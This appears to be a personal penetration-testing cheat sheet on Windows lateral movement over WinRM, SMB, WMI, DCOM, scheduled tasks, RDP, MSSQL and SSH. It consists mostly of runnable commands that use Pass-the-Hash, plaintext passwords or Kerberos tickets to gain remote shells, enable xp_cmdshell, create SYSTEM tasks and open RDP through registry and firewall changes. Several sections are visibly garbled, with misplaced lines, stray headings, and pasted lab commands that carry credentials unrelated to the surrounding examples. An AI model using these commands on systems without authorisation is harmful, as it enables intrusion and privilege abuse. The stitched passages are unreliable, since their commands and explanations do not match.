---
created: 2026-08-15
updated: 2026-09-21
---
>[!abstract]+ **Scope**: Windows remote management protocols, administrative execution mechanisms, and lateral movement tools; establishing remote sessions using WinRM, SMB/RPC, WMI, DCOM, Task Scheduler, RDP, MSSQL, and OpenSSH; credential options, Pass-the-Hash, and Kerberos authentication.

## Remote access protocols

- Windows supports multiple administrative and management protocols for remote access and command execution:

| Protocol           | Default ports                 | Protocol / transport                    | Execution mechanism                         | Required privileges                         | Common tools                                                                 |
| :----------------- | :---------------------------- | :-------------------------------------- | :------------------------------------------ | :------------------------------------------ | :--------------------------------------------------------------------------- |
| **WinRM**          | `5985` (HTTP), `5986` (HTTPS) | HTTP/HTTPS (SOAP/WS-Man)                | PowerShell runspaces, Wsmid                 | `Remote Management Users`, `Administrators` | `Evil-Winrm`, <br>`Enter-PSSession`, <br>`Invoke-Command`, `netexec`         |
| **SMB / RPC**      | `445` (TCP)                   | SMB Named Pipes (`\pipe\svcctl`)        | Service Control Manager (service binary)    | `Administrators`                            | `psexec.py`, <br>`smbexec.py`, <br>`PsExec.exe`, <br>`sc.exe`, <br>`netexec` |
| **WMI**            | `135` (RPC), `49152-65535`    | RPC / DCOM                              | `Win32_Process.Create`                      | `Administrators`                            | `wmiexec.py`, <br>`wmic`, <br>`Invoke-CimMethod`, <br>`netexec`              |
| **DCOM**           | `135` (RPC), `49152-65535`    | RPC / DCOM                              | Object activation (`MMC20`, `ShellWindows`) | `Distributed COM Users`, `Administrators`   | `dcomexec.py`, <br>PowerShell COM objects                                    |
| **Task Scheduler** | `135`, `445` (RPC)            | RPC (`ITaskScheduler` / `ITaskService`) | Scheduled task creation                     | `Administrators`                            | `atexec.py`, <br>`schtasks.exe`                                              |
| **RDP**            | `3389` (TCP/UDP)              | RDP (TLS / NLA)                         | Interactive graphical session               | `Remote Desktop Users`, `Administrators`    | `xfreerdp`, <br>`mstsc.exe`, <br>`Remmina`                                   |
| **MSSQL**          | `1433` (TCP)                  | TDS (Tabular Data Stream)               | Extended stored procedures (`xp_cmdshell`)  | `sysadmin` role, `CONTROL SERVER`           | `mssqlclient.py`, <br>`sqlcmd`, <br>`netexec`                                |
| **SSH**            | `22` (TCP)                    | SSH                                     | Interactive shell, command execution        | Local / domain user account                 | `ssh`, <br>`sftp`                                                            |

## Connecting via WinRM

By default, this group is empty, and only members of the local **`Administrators`** group can connect via RDP.
- Windows Remote Management (WinRM) is the Microsoft implementation of the WS-Management protocol.
- WinRM communicates over HTTP on TCP port `5985` and HTTPS on TCP port `5986`.

- Enumerate members of the `Remote Desktop Users` group using [`Get-NetLocalGroupMember`](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) (PowerView):
>[!note] Membership in the local **`Remote Management Users`** or **`Administrators`** group is required to establish WinRM sessions. See [[🛠️ Pass-the-Hash]] and [[Kerberos]].

### Connecting with `Evil-WinRm`

- Connect using a plaintext password from Linux:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123'
```

- Authenticate using Pass-the-Hash with an NTLM hash:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -H 2b576acfd5e0c865136732c44b49b6b1
```

- Authenticate using a Kerberos ticket (`KRB5CCNAME` cache):

```bash
evil-winrm -i dc01.example.com -r example.com -k
```

- Connect over an encrypted HTTPS listener:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123' -S
```

- Load PowerShell scripts and binaries into memory upon connection:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123' -s /opt/scripts -e /opt/binaries
```

- `evil-winrm` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `-i` | `10.10.11.5` | Target IP address or FQDN. |
| `-u` | `jdoe` | Username for authentication. |
| `-p` | `'passwd123'` | Plaintext password. |
| `-H` | `2b576...` | NTLM hash for Pass-the-Hash authentication. |
| `-k` | — | Uses Kerberos authentication from the `KRB5CCNAME` ccache file. |
| `-r` | `example.com` | Kerberos realm or Active Directory domain. |
| `-S` | — | Enables SSL/TLS transport on TCP port `5986`. |
| `-s` | `/opt/scripts` | Path to local directory containing PowerShell scripts to load into memory. |
| `-e` | `/opt/binaries` | Path to local directory containing executables for in-memory execution. |

### Executing commands with NetExec WinRM

- Run a remote command via WinRM:

```bash
netexec winrm 10.10.11.5 -u jdoe -p 'passwd123' -x 'whoami /all'
```

- Execute a PowerShell script block on the target:

```bash
netexec winrm 10.10.11.5 -u jdoe -p 'passwd123' -X 'Get-Process'
```

### Establishing native PowerShell remoting sessions

- Convert the plaintext password to a secure string:

```powershell
Get-NetLocalGroupMember -ComputerName DC01 -GroupName "Remote Desktop Users"
$password = ConvertTo-SecureString 'passwd123' -AsPlainText -Force
```

## WinRM
- Create a PSCredential object:

- Enumerate members of the `Remote Desktop Users` group using [`Get-NetLocalGroupMember`](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) (PowerView):
```powershell
$cred = New-Object System.Management.Automation.PSCredential ('example\jdoe', $password)
```

- Open an interactive PowerShell session from Windows:

```powershell
Get-NetLocalGroupMember -ComputerName DC01 -GroupName "Remote Desktop Users"
Enter-PSSession -ComputerName 10.10.11.5 -Credential $cred
```

### WinRM from Windows
- Open an interactive session over HTTPS on port `5986`:

```powershell
Enter-PSSession -ComputerName dc01.example.com -Credential $cred -UseSSL -Port 5986
```

- Establishing WinRM session from Windows:
- Execute a script block on a remote host:

```powershell
Invoke-Command -ComputerName 10.10.11.5 -Credential $cred -ScriptBlock { whoami /priv }
```

- Execute a local script file against a remote host:

```powershell
Invoke-Command -ComputerName 10.10.11.5 -Credential $cred -FilePath .\enum.ps1
```

>[!tip]+
> - Verify WinRM listener availability before connecting:
>
> ```powershell
> Test-WSMan -ComputerName 10.10.11.5
> ```

## Executing commands via SMB and RPC

- Remote management over SMB (TCP port `445`) uses Remote Procedure Call (RPC) interfaces exposed through named pipes.
- Tools like `psexec.py` and `smbexec.py` communicate with the Service Control Manager (SCM) via `\pipe\svcctl` to create and run temporary Windows services.

>[!note] SCM manipulation and remote service creation require membership in the local **`Administrators`** group.

### Executing commands with `psexec.py`

- `psexec.py` uploads a service executable to the `ADMIN$` share, registers it as a service, redirects standard I/O over named pipes, and deletes the service binary upon completion.
- Connect with a plaintext password:

```bash
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force PS $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
psexec.py example.com/jdoe:'passwd123'@10.10.11.5
```

### WinRM from Linux (`Evil-WinRM`)
- Connect using Pass-the-Hash:

```bash
psexec.py -hashes :2b576acfd5e0c865136732c44b49b6b1 example.com/jdoe@10.10.11.5
```

- Connect using Kerberos authentication:

```bash
evil-winrm -i 10.10.11.5 -u jdoe
psexec.py -k -no-pass example.com/jdoe@dc01.example.com
```

## MSSQL admin
## `Enter-PSSession`
- `psexec.py` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `target` | `example.com/jdoe...` | Target string formatted as `[domain/]username[:password]@<target>`. |
| `-hashes` | `:2b576...` | NTLM hash formatted as `[LMHASH:]NTHASH` for Pass-the-Hash. |
| `-no-pass` | — | Suppresses the password prompt when using Kerberos or blank passwords. |
| `-k` | — | Uses Kerberos authentication from the `KRB5CCNAME` ccache file. |
| `-service-name` | `svc_custom` | Sets a custom service name on the target host. |
| `-remote-binary-name` | `srv.exe` | Sets a custom binary filename uploaded to the remote share. |

### Executing commands with `smbexec.py`

- `smbexec.py` creates a service that runs `cmd.exe /c` directly, redirecting standard output to a file on a writable share (default `C$`), avoiding the need to upload an executable binary.
- Connect with a password:

```bash
smbexec.py example.com/jdoe:'passwd123'@10.10.11.5
```

- Connect with Pass-the-Hash:

```bash
smbexec.py -hashes :2b576acfd5e0c865136732c44b49b6b1 example.com/jdoe@10.10.11.5
```

- Use a custom share for temporary output files:

```bash
smbexec.py -share ADMIN$ example.com/jdoe:'passwd123'@10.10.11.5
```

- `smbexec.py` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `target` | `example.com/jdoe...` | Target string formatted as `[domain/]username[:password]@<target>`. |
| `-hashes` | `:2b576...` | NTLM hash formatted as `[LMHASH:]NTHASH` for Pass-the-Hash. |
| `-share` | `ADMIN$` | Remote writable SMB share used for storing command output. |
| `-port` | `445` | SMB destination port. |

### Executing commands with NetExec SMB

- Run commands over SMB using the default method:

```bash
netexec smb 10.10.11.5 -u jdoe -p 'passwd123' -x 'whoami /all'
```

- Run commands via the `smbexec` execution method:

```bash
netexec smb 10.10.11.5 -u jdoe -p 'passwd123' --exec-method smbexec -x 'ipconfig /all'
```

### Executing commands natively on Windows

- Connect and spawn an interactive `SYSTEM` shell using Sysinternals `PsExec.exe`:

```cmd
PsExec.exe \\10.10.11.5 -u example\jdoe -p 'passwd123' -s cmd.exe
```

- Create a remote service pointing to an executable:

```cmd
sc.exe \\10.10.11.5 create RemoteSvc binPath= "C:\Windows\Temp\agent.exe" start= demand
```

- Start the newly created service:

```cmd
sc.exe \\10.10.11.5 start RemoteSvc
```

- Delete the service after execution:

```cmd
sc.exe \\10.10.11.5 delete RemoteSvc
```

## Executing commands via WMI and DCOM

- Windows Management Instrumentation (WMI) and Distributed Component Object Model (DCOM) allow remote administration over RPC (TCP port `135` and high dynamic RPC ports `49152-65535`).

>[!note] WMI process creation requires local administrative rights. DCOM activation can also be performed by members of the **`Distributed COM Users`** group.

### Executing commands with `wmiexec.py`

- `wmiexec.py` invokes the `Win32_Process.Create` method over WMI and retrieves command output through SMB file writes to the `ADMIN$` share.
- Connect with a password:

```bash
wmiexec.py example.com/jdoe:'passwd123'@10.10.11.5
```

- Connect with Pass-the-Hash:

```bash
wmiexec.py -hashes :2b576acfd5e0c865136732c44b49b6b1 example.com/jdoe@10.10.11.5
```

- Connect with Kerberos authentication:

```bash
wmiexec.py -k -no-pass example.com/jdoe@dc01.example.com
```

- `wmiexec.py` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `target` | `example.com/jdoe...` | Target string formatted as `[domain/]username[:password]@<target>`. |
| `-hashes` | `:2b576...` | NTLM hash formatted as `[LMHASH:]NTHASH` for Pass-the-Hash. |
| `-no-pass` | — | Suppresses the password prompt when using Kerberos or blank passwords. |
| `-k` | — | Uses Kerberos authentication from the `KRB5CCNAME` ccache file. |
| `-share` | `ADMIN$` | Share used to write and read command output files. |
| `-shell-type` | `powershell` | Shell wrapper used to execute commands (`cmd` or `powershell`). |

### Executing commands with `dcomexec.py`

- `dcomexec.py` abuses exposed DCOM objects such as `MMC20.Application`, `ShellWindows`, or `ShellBrowserWindow` to spawn child processes.
- Execute commands via the `MMC20.Application` DCOM object:

```bash
dcomexec.py -object MMC20 example.com/jdoe:'passwd123'@10.10.11.5
```

- Execute commands via the `ShellWindows` DCOM object:

```bash
dcomexec.py -object ShellWindows example.com/jdoe:'passwd123'@10.10.11.5
```

- Execute commands with Pass-the-Hash:

```bash
dcomexec.py -hashes :2b576acfd5e0c865136732c44b49b6b1 -object MMC20 example.com/jdoe@10.10.11.5
```

- `dcomexec.py` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `-object` | `MMC20` | Target DCOM object (`MMC20`, `ShellWindows`, or `ShellBrowserWindow`). |
| `-hashes` | `:2b576...` | NTLM hash formatted as `[LMHASH:]NTHASH` for Pass-the-Hash. |
| `-silentcommand` | — | Executes the command without retrieving standard output. |

### Executing commands natively with WMI and DCOM

- Create a process on a remote host using `wmic`:

```cmd
wmic /node:10.10.11.5 /user:example\jdoe /password:'passwd123' process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

- Configure DCOM session options in PowerShell:

```powershell
$user = "inlanefreight\svc_sql"  
$Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force  
$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
$opt = New-CimSessionOption -Protocol DCOM
```

- Create a CIM session to the remote host:

```powershell
Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials
$session = New-CimSession -ComputerName 10.10.11.5 -Credential $cred -SessionOption $opt
```

- Create a process on a remote host using `Invoke-CimMethod`:

```powershell
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'calc.exe'}
```

- Instantiate a remote DCOM object via PowerShell:

```powershell
$dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.11.5"))
```

- Execute a command using the DCOM object:

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Windows\Temp\out.txt", "7")
```

## Scheduling tasks with atexec

- Task Scheduler interfaces exposed over RPC (`ITaskScheduler` on Windows Server 2003 / `ITaskService` on Windows Vista and later) allow remote job creation and execution running as `SYSTEM`.

>[!note] Remote task creation requires administrative access rights on the target host.

### Executing commands with `atexec.py`

- `atexec.py` creates a temporary scheduled task, runs the specified command, retrieves standard output via SMB, and removes the task upon completion.
- Execute a command with a password:

```bash
atexec.py example.com/jdoe:'passwd123'@10.10.11.5 'whoami /all'
```

- Execute a command using Pass-the-Hash:

```bash
atexec.py -hashes :2b576acfd5e0c865136732c44b49b6b1 example.com/jdoe@10.10.11.5 'ipconfig /all'
```

- Execute a command using Kerberos authentication:

```bash
atexec.py -k -no-pass example.com/jdoe@dc01.example.com 'whoami /priv'
```

- `atexec.py` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `target` | `example.com/jdoe...` | Target string formatted as `[domain/]username[:password]@<target>`. |
| `command` | `'whoami /all'` | Command to execute inside the scheduled task. |
| `-hashes` | `:2b576...` | NTLM hash formatted as `[LMHASH:]NTHASH` for Pass-the-Hash. |
| `-k` | — | Uses Kerberos authentication from the `KRB5CCNAME` ccache file. |

### Scheduling remote tasks natively on Windows

- Create a remote scheduled task configured to execute as `SYSTEM`:

```cmd
schtasks /create /s 10.10.11.5 /u example\jdoe /p 'passwd123' /ru "SYSTEM" /tn "AuditJob" /tr "cmd.exe /c whoami > C:\Windows\Temp\out.txt" /sc once /st 00:00
```

- Trigger the scheduled task on demand:

```cmd
schtasks /run /s 10.10.11.5 /u example\jdoe /p 'passwd123' /tn "AuditJob"
```

- Remove the scheduled task:

```cmd
schtasks /delete /s 10.10.11.5 /u example\jdoe /p 'passwd123' /tn "AuditJob" /f
```

## Connecting via RDP

- Remote Desktop Protocol (RDP) provides interactive graphical desktop access over TCP/UDP port `3389`.

>[!note] Membership in the local **`Remote Desktop Users`** or **`Administrators`** group is required to log on via RDP.

### Connecting with `xfreerdp`

- Establish an interactive graphical session with dynamic resolution and clipboard redirection:

```bash
xfreerdp /v:10.10.11.5 /u:jdoe /p:'passwd123' /d:example.com /dynamic-resolution +clipboard /cert:ignore
```

- Connect using Pass-the-Hash in Restricted Admin Mode:

```bash
xfreerdp /v:10.10.11.5 /u:jdoe /pth:2b576acfd5e0c865136732c44b49b6b1 /restricted-admin /cert:ignore
```

- Mount a local Linux directory as a mapped share in the remote session:

```bash
xfreerdp /v:10.10.11.5 /u:jdoe /p:'passwd123' /drive:tools,/opt/tools /cert:ignore
```

- `xfreerdp` options cheat sheet:

| Option | Parameter | Description |
| :--- | :--- | :--- |
| `/v:` | `10.10.11.5[:3389]` | Target server IP address, hostname, or FQDN. |
| `/u:` | `jdoe` | Username for authentication. |
| `/p:` | `'passwd123'` | Plaintext password. |
| `/d:` | `example.com` | Active Directory domain name. |
| `/pth:` | `2b576...` | NTLM hash for Pass-the-Hash authentication. |
| `/restricted-admin` | — | Connects in Restricted Admin Mode (avoids caching plaintext credentials in remote LSASS). |
| `/dynamic-resolution` | — | Automatically adjusts resolution when resizing the client window. |
| `+clipboard` | — | Enables bidirectional clipboard redirection. |
| `/drive:` | `name,/path` | Redirects a local directory as a mapped network drive. |
| `/cert:ignore` | — | Bypasses TLS certificate validation errors. |

### Connecting with native Windows tools

- Connect using Remote Desktop Connection in Restricted Admin Mode:

```cmd
mstsc.exe /v:10.10.11.5 /restrictedAdmin
```

- Connect directly to the console or administrative session:

```cmd
mstsc.exe /v:10.10.11.5 /admin
```

- Enable the RDP listener in the registry:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

- Enable Restricted Admin Mode in the registry:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

- Enable Remote Desktop firewall rules:

```powershell
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

## Interacting with MSSQL instances

- Microsoft SQL Server listens on TCP port `1433` by default using the Tabular Data Stream (TDS) protocol.
- SQL Server supports SQL authentication (local SQL accounts such as `sa`) and Windows authentication (integrated Active Directory accounts).

>[!note] Accounts assigned the **`sysadmin`** fixed server role or possessing the `CONTROL SERVER` permission can enable the `xp_cmdshell` extended stored procedure to execute operating system commands.

### Interacting with `mssqlclient.py`

- Connect with local SQL Server credentials (`sa`):

```bash
mssqlclient.py sa:'passwd123'@10.10.11.5
```

- Connect with Windows domain credentials:

```bash
mssqlclient.py -windows-auth example.com/jdoe:'passwd123'@10.10.11.5
```

- Connect using Pass-the-Hash:

```bash
mssqlclient.py -hashes :2b576acfd5e0c865136732c44b49b6b1 -windows-auth example.com/jdoe@10.10.11.5
```

- Connect using Kerberos authentication:

```bash
mssqlclient.py -k -no-pass -windows-auth example.com/jdoe@dc01.example.com
```

- `mssqlclient.py` parameter breakdown:

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `target` | `example.com/jdoe...` | Target string formatted as `[domain/]username[:password]@<target>`. |
| `-windows-auth` | — | Uses Windows / Kerberos domain authentication instead of standard SQL Server authentication. |
| `-hashes` | `:2b576...` | NTLM hash formatted as `[LMHASH:]NTHASH` for Pass-the-Hash. |
| `-no-pass` | — | Suppresses the password prompt when using Kerberos authentication. |
| `-k` | — | Uses Kerberos authentication from the `KRB5CCNAME` ccache file. |
| `-port` | `1433` | SQL Server listening port. |

- Enable `xp_cmdshell` inside the interactive `mssqlclient.py` shell:

```sql
enable_xp_cmdshell
```

- Execute operating system commands inside the interactive `mssqlclient.py` shell:

```sql
xp_cmdshell whoami /all
```

### Executing commands with NetExec MSSQL

- Execute operating system commands via the `xp_cmdshell` module:

```bash
netexec mssql 10.10.11.5 -u jdoe -p 'passwd123' -M xp_cmdshell -o CMD='whoami /all'
```

- Query the SQL Server version and configuration directly:

```bash
netexec mssql 10.10.11.5 -u jdoe -p 'passwd123' -q 'SELECT @@VERSION;'
```

### Interacting with `sqlcmd` on Windows

- Connect with Windows authentication and run a query:

```cmd
sqlcmd -S 10.10.11.5 -E -Q "SELECT @@SERVERNAME;"
```

- Enable `xp_cmdshell` and execute operating system commands:

```cmd
sqlcmd -S 10.10.11.5 -U sa -P 'passwd123' -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami /all';"
```

## Connecting via SSH

- Windows 10, Windows 11, and Windows Server 2019+ include native OpenSSH server (`sshd`) support listening on TCP port `22`.

### Establishing SSH sessions

- Connect using password authentication:

```bash
ssh jdoe@10.10.11.5
```

- Connect using domain account credentials:

```bash
ssh 'example.com\jdoe'@10.10.11.5
```

- Connect using an SSH private key:

```bash
ssh -i ~/.ssh/id_rsa jdoe@10.10.11.5
```

- Execute a remote PowerShell command non-interactively:

```bash
ssh jdoe@10.10.11.5 "powershell.exe -NoProfile -Command Get-Process"
```

## References and further reading

- [`Windows Remote Management — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
- [`Remote Desktop Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/welcome-to-rds)
- [`Evil-WinRM Repository — GitHub`](https://github.com/Hackplayers/evil-winrm)
- [`Impacket Suite — GitHub`](https://github.com/fortra/impacket)
- [`NetExec Documentation`](https://www.netexec.wiki/)
- [`FreeRDP User Documentation`](https://github.com/FreeRDP/FreeRDP/wiki)
- [`Sysinternals PsExec — Microsoft Learn`](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
